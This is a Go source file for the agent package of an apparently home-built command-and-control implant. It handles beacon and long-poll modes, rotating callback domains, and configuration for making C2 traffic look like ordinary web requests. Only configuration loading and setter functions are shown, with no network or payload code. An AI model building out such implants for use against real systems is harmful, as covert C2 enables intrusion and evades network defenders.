// Package agent provides a C2 agent compatible with the Slither C2 Framework
package agent

import (
	_ "embed" // Has hte underscore as it is only being used for side efects
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"slices"
)

// Agent represents a single C2 agent that can operate in a beacon or long-poll mode
// There is only a single Agent declared for each class
type Agent struct {
	domains           []string
	mode              string // l for long-pool, b for beacon
	stayAlive         bool
	activeDomain      string
	session           *http.Client
	beaconInter       int
	watchdogTimer     int
	modificationCheck bool
}

// agentConfig is the complete configuration structure of contents to be loaded from agent_config.json
type agentConfig struct {
	Domains        []string                     `json:"domains"`
	BeaconTimer    int                          `json:"beacon_timer"`
	WatchdogTimer  int                          `json:"watchdog_timer"`
	URLExtensions  URLExtensions                `json:"url_extensions"`
	URLParameters  URLParameters                `json:"url_parameters"`
	FileExtensions map[string]FileExtensionInfo `json:"file_extensions"`
}

// URLExtensions is for path segments to create realistic URLS, file extension agnostic
type URLExtensions struct {
	CommonPaths    []string `json:"common_paths"`
	RandomSegments []string `json:"random_segments"`
}

// URLParameters if for parameters ot create realistic URLs, file extension agnostic
type URLParameters struct {
	CommonParams    []string `json:"common_params"`
	TimestampValues []string `json:"timestamp_values"`
	VersionValues   []string `json:"version_values"`
	HashValues      []string `json:"hash_values"`
}

// FileExtensionInfo is for generating realistic fileNames, is NOT file extension agnostic
type FileExtensionInfo struct {
	Paths     []string `json:"paths"`
	Params    []string `json:"params"`
	Filenames []string `json:"filenames"`
}

//go:embed agent_config.json
var configFile []byte // Embeds the agent_config as a json

func ExtractAndCreateAgent() (*Agent, *agentConfig, error) {
	ac, err := extractAgentConfig()
	if err != nil {
		fmt.Print(err)
		return nil, ac, err
	}
	agent := newAgent(ac.Domains, "b", ac.BeaconTimer, ac.WatchdogTimer)
	return agent, ac, err
}

// NewAgent creates a new Agent
// All parameters for rendering an agent should be inputted.
func newAgent(domains []string, mode string, beaconTimer int, watchdogTimer int) *Agent {
	return &Agent{
		domains:       domains,
		mode:          "b",
		stayAlive:     true,
		activeDomain:  domains[0],
		beaconInter:   beaconTimer,
		watchdogTimer: watchdogTimer,
	}
}

// extractAgentConfig() extracts the agent config from the json
// uses the agentconfig structs defined above
func extractAgentConfig() (*agentConfig, error) {
	var ac agentConfig

	// Unmarshal extracts text from a json and applies to to a matching struct
	// The pointer to the struct is passed in
	err := json.Unmarshal(configFile, &ac)
	if err != nil {
		fmt.Println(err)
		return nil, err
	}

	return &ac, err
}

// GETTER AND SETTER COMMANDS

// removeDomain removes a domain from the list of the agents current domains
// This function will fail if there is only one domain in the list, or the domain that is requested to be removed does not exist
func removeDomain(a *Agent, domain string) error {
	if len(a.domains) < 2 {
		return errors.New("domain list only has one domain, cannot remove")
	}

	index := slices.Index(a.domains, domain)

	if index == -1 {
		return errors.New("domain is not in the domain list")
	}

	a.domains = append(a.domains[:index], a.domains[index+1:]...)

	return nil
}

// addDomain adds a domain to the list of the agents possible domains
// Errors if the domain to be added already exists
func addDomain(a *Agent, domain string) error {
	if slices.Contains(a.domains, domain) {
		return errors.New("domain already exists inside of the domain list")
	}

	a.domains = append(a.domains, domain)

	return nil
}

func setActiveDomain(a *Agent, domain string) error {
	if !slices.Contains(a.domains, domain) {
		return errors.New("domain does not exist inside of the domain list, please add it first")
	}

	a.activeDomain = domain

	return nil
}

// isAlive returns true if the agent is alive
func isAlive(a *Agent) bool {
	return a.stayAlive
}

// killAgent kills the agent by setting its aliveStatus to false
func killAgent(a *Agent) {
	a.stayAlive = false
	return
}

// isBeacon returns true if the agent is in beacon mode
func isBeacon(a *Agent) bool {
	return a.mode == "b"
}

// setBeacon sets the agent in beacon mode
func setBeacon(a *Agent) {
	a.mode = "b"
	return
}

// setLongpoll sets the agent in longpolling mode
func setLongpoll(a *Agent) {
	a.mode = "l"
	// TODO: A session should be set for the long polling
	return
}

// setBeaconInter sets the beacon interval timer from a modification command
func setBeaconInter(a *Agent, interval int) error {
	if interval < 1 {
		return errors.New("interval must be a positive integer")
	}
	a.beaconInter = interval
	return nil
}

func isModify(a *Agent) bool {
	return a.modificationCheck
}

// AgentFromJSON gets all attributes from the agent_config.json file
// It runs these through the NewAgent function to create an agent
// TODO: Eventually the parsing should be done using a struct and Marshal
//
//	func AgentFromJSON() *Agent {
//		// Filter through the agent_config json file
//		jsonFile, err := os.Open("agent_config.json")
//		if err != nil {
//			fmt.Println(err)
//		}
//
//		agent := NewAgent()
//	}
func main() {
}
